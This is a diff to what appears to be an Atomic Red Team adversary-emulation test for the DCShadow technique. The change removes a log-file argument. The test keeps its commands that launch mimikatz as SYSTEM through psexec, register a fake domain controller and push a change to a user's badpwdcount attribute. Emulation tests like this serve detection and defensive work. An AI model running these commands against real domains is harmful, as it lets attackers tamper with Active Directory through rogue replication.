@@ -21,10 +21,6 @@ atomic_tests:
       description: Targeted user (for machine account do not forget to add final '$')
       type: string
       default: CLIENT1$
-    output_file:
-      description: Output file
-      type: path
-      default: '$env:TEMP\mimikatz\x64\mimikatz.log'
     mimikatz_path:
       description: Mimikatz windows executable
       type: path
@@ -60,7 +56,7 @@ atomic_tests:
     elevation_required: true
     command: |
       # starting fake DC server, as SYSTEM (required)
-      $mimikatzParam ="`"log #{output_file}`" `"lsadump::dcshadow /object:#{user} /attribute:badpwdcount /value:9999`" `"exit`""
+      $mimikatzParam ="`"lsadump::dcshadow /object:#{user} /attribute:badpwdcount /value:9999`" `"exit`""
       Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
 
       # wait for fake DC server to be ready...
@@ -70,4 +66,3 @@ atomic_tests:
       & #{mimikatz_path} "lsadump::dcshadow /push" "exit"
     cleanup_command: |
       Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
-      Remove-Item #{output_file} -ErrorAction Ignore
